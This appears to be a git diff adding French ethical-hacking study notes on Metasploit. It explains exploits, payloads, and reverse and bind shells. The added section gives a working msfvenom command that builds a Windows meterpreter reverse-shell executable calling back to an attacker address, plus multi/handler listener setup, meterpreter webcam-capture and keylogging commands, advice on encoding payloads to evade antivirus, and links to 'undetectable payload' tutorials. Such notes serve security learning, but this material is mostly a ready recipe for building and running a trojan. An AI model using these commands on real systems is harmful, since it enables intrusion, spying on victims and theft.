@@ -469,9 +469,22 @@ apache web server vulnerable to a Ddos attack
 OpenVAS #scanner de vulnerabilites
 Nessus #logiciel scanner de vulnerabilites
 Nikto #scanner vulnerabilites d'un serveur web
-metasploit
 ```
 
+Metasploit :
+C'est un framework = ensemble de nombreux logiciels. Permet de collecter des informations, créer des logiciels malveillants, pirater des FTP, pirater Android et bien d’autres choses. Nmap est également intégré dans Metasploit ; vous pouvez utiliser Nmap dans Metasploit sans avoir besoin d’ouvrir un nouveau Terminal
+- Exploit : Dans Metasploit exploit signifie exploiter. Si vous avez installé le shell inversé correctement sur la machine cible, vous pouvez explorer le système avec l’aide d’exploit. Par défaut, 1590 exploits sont disponibles dans Metasploit. Possibilite de creer son propre exploit dans Metasploit.
+- Payload : bout de code qui permet de pirater le système et exploit aide à faire tout ce que vous voulez faire avec la machine piratée. Cela vous aide à créer un virus.
+```
+##LHOST : lhost est l’adresse IP de l’attaquant
+##LPORT : C’est le port que vous souhaitez utiliser
+##RHOST : Ceci est l’adresse IP de la machine victime
+##RPORT : Le numéro de port de la victime.
+#### start :
+service postgresql start #aide a faire tourner metasploit
+msfconsole #lance metaqsploit
+Show exploits #Pour afficher les différents types d’exploits
+```
 
 
 ### 3. System Hacking
@@ -529,7 +542,80 @@ echo 1 > /proc/sys/net/ipv4/ip_forward #activer le forwarding des paquets
 ```
 
 
-#### Malware Threats, Denial-of-Service, Session Hijacking, SQL injection ..
+#### Malware Threats
+
+
+- msfvenom = composant majeur de Metasploit qui vous permet de générer des payloads, exécutables, shellcodes, apk pour les utiliser dans vos exploitations. Cependant, ces shellcodes créés ne sont pas si effaces que ça en a l’air. Ils contiennent de mauvais caractères ce qui fait qu’un antivirus stupide peut les attraper facilement, c’est pourquoi vous aurez besoin d’une autre fonctionnalité de msfvenom qui est l’encodage, ce dernier permet d’éviter ces mauvais caractères.  le meilleur classement est celui de l’encodeur x86/shikata_ga_nai
+
+
+- exploit = une faille dans un système, application ou un service qui va permettre à un attaquant de l’exploiter afin de compromettre sa sécurité.
+- payload = code que le système va exécuter pour avoir un résultat précis. Exemple : un reverse shell est un payload qui se charge de créer une connexion de la machine victime vers la machine de l’attaquant tandis qu’un bind shell est un payload qui lie (bind) l’invite de commande avec un port en écoute.
+- shellcode = semblable aux payloads sauf qu’il est écrit en assembly. Exemple : après avoir exploité une machine, un meterpreter shell est fourni pour interagir avec la machine compromise.
+- listener = lorsque vous exploitez un système, ce dernier va tenter d’établir une connexion avec votre machine. Pour cela le listener va écouter jusqu’à l’établissement de la connexion.
+
+Difference entre reverse_tcp et bind_tcp :
+- [reverse_tcp]
+attacker-> [contact me at the port 4444]-> victim - 
+after the payload is executed - 
+attacker <-> [port 4444] <-> victim
+
+- [bind_tcp]
+attacker-> [open the way for me in the port 4444]-> victim - 
+after execution - 
+attacker <-> [port 4444] <-> victim - 
+
+
+- Staged Payload : Le staged payload classique de Metasploit est : windows/meterpreter/reverse_tcp. Ce type de payload est généralement envoyé sur la machine de la victime en deux parties. La première partie est un payload primaire (stage 0) qui crée une connexion entre la machine de la victime à celle de l’attaquant. Un deuxième payload (stage 1) contenant l’exploit est ensuite envoyé à travers la connexion créée, puis exécuté sur la machine de la victime.
+- Stageless Payload : L’équivalent du staged payload classique présenté plus haut (windows/meterpreter/reverse_tcp) dans la catégorie des stageless est: windows/meterpreter_reverse_tcp. Dans cette catégorie, le payload est envoyé entièrement sur la machine de la victime. Celui-ci contient tout ce qui est nécessaire pour obtenir un reverse shell vers la machine de l’attaquant. Aucun transfert supplémentaire à partir de la machine de l’attaquant n’est nécessaire.
+
+
+
+
+Creer malware avec metasploit (etre en root):
+```
+msfvenom –p windows/meterpreter_reverse_tcp –f exe –a x86 –platform windows  LHOST 192.168.174.192 LPORT 4444 –o santy.exe
+## attention ordre arguments important
+#-p prépare le payload.
+#-f exe indique que le type de fichier, ou l’extension de fichier sera exe (windows)
+#-a x86 indique l’architecture système. x86 est utilisée dans les systèmes 32 bits, même si mon système est en 64 bits, on peut faire tourner un programme 32 bits sur un système 64 bits.
+#–platform windows indique que ce virus est pour Windows.
+#-o est le chemin d’enregistrement du fichier, avec son nom. Comme je veux l’enregistrer dans le dossier root, je ne précise que son nom.
+##Le fichier sera sauvegardé dans le répertoire de travail actuel
+```
+```
+#Before executing this file in the target computer, we need to start the multi-handler to listen for incoming connections
+use mulit/handler #use permet de sélectionner un module à utiliser (back permet de sortir de ce module)
+#A module is a piece of software that the Metasploit Framework uses to perform a task, such as exploiting or scanning a target. A module can be an exploit module, auxiliary module, or post-exploitation module.
+#multi/handler : Ce module est un stub qui fournit toutes les fonctionnalités du système de charge utile Metasploit aux exploits qui ont été lancés en dehors du framework
+```
+
+```
+set PAYLOAD windows/meterpreter/reverse_tcp #meme payload que vous avez utilisé pour créer le malware
+set LHOST 192.168.174.129
+set LPORT 4444
+exploit #ou run c la meme chose
+#Quand la victime lance ce programme, vous allez voir que Metasploit et Meterpreter s’ouvriront
+```
+```
+webcam_snap
+start keyscan_start
+keyscan_stop
+```
+
+```
+top #voir tous les running processus en direct
+pgrep -lf python #voir les scripts python qui tournent
+kill -9 <pid> #kill le processus
+```
+
+[msfvenom tutorial with different payloads exemples](https://www.hackingarticles.in/msfvenom-tutorials-beginners/)
+
+Payloads encoded with Base64, easily detected by antivirus, https://null-byte.wonderhowto.com/how-to/hacking-macos-create-undetectable-payload-0189715/
+Payloads connus parce que classiques sur metasploit. --> Encrypting Better Than Encoding. Par exemple avec Armor voir tuto en dessous
+[Video tuto Create Undetectable Payloads for macOS Computers with Tokyoneon's Armor](https://www.youtube.com/watch?v=qgroUbiuNTU&t=1s)
+
+
+#### Denial-of-Service, Session Hijacking, SQL injection ..
 
 # IV - Hack the Box
 ### Installation
